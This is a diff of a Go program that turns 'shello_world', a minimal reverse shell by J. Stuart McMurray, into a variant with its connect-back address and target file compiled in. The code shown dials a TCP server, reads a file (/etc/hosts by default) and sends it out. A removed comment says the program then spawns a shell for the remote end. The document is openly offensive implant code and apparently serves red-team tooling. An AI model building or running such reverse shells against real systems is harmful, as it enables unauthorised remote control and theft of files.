@@ -1,0 +1,52 @@
+--- ../shello_world/shello_world.go	Fri Sep  6 22:17:59 2024
++++ argv_from_source.go	Sat Sep  7 18:45:53 2024
+@@ -1,12 +1,12 @@
+-// Program shello_world - The shell equivalent of Hello, World!
++// Program argv_from_source - shello_world with baked-in config
+ package main
+ 
+ /*
+- * shello_world.go
+- * The shell equivalent of Hello, World!
++ * argv_from_source.go
++ * shello_world, but with baked-in config
+  * By J. Stuart McMurray
+  * Created 20240901
+- * Last Modified 20240901
++ * Last Modified 20240902
+  */
+ 
+ import (
+@@ -16,25 +16,21 @@
+ 	"os/exec"
+ )
+ 
+-/*
+-This is about as simple a shell as can be.  It connects to its first argument
+-via TCP, sends back its second argument, which should be a file, and spawns a
+-shell.
++// Compile-time configurables
++var (
++	Address = "localhost:4444"
++	File    = "/etc/hosts"
++)
+ 
+-It is not great code.
+-
+-Usage: ./shello_world addr:port filename
+-*/
+-
+ func main() {
+ 	/* Connect to the server. */
+-	c, err := net.Dial("tcp", os.Args[1])
++	c, err := net.Dial("tcp", Address)
+ 	if nil != err {
+ 		log.Fatalf("Error connecting to server: %s", err)
+ 	}
+ 
+ 	/* Send back the file. */
+-	b, err := os.ReadFile(os.Args[2])
++	b, err := os.ReadFile(File)
+ 	if nil != err {
+ 		log.Fatalf("Error reading file: %s", err)
+ 	}
